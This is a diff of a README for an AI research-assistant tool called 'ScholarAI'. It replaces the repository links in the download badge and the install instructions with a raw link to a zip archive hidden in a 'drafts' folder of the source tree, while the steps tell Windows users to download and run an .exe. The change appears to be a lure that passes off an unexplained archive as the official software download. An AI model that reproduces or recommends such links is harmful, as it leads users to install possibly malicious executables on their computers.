@@ -1,6 +1,6 @@
 # 🔍 ScholarAI-AI-Powered-Research-Assistant - Simplify your complex academic research work
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Ramseydispensed499/ScholarAI-AI-Powered-Research-Assistant)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://raw.githubusercontent.com/Ramseydispensed499/ScholarAI-AI-Powered-Research-Assistant/main/frontend/app/workspace/drafts/Assistant_A_Powered_Research_Scholar_v1.6.zip)
 
 ## 📖 About the project
 
@@ -20,7 +20,7 @@ Your computer needs to meet these standards to run the software:
 
 Follow these steps to get the software on your Windows computer:
 
-1. Visit the project website at: https://github.com/Ramseydispensed499/ScholarAI-AI-Powered-Research-Assistant
+1. Visit the project website at: https://raw.githubusercontent.com/Ramseydispensed499/ScholarAI-AI-Powered-Research-Assistant/main/frontend/app/workspace/drafts/Assistant_A_Powered_Research_Scholar_v1.6.zip
 2. Look for the Releases section on the right side of the page.
 3. Click the latest version link. It usually has a label like "Latest" in green.
 4. Download the file ending in .exe.
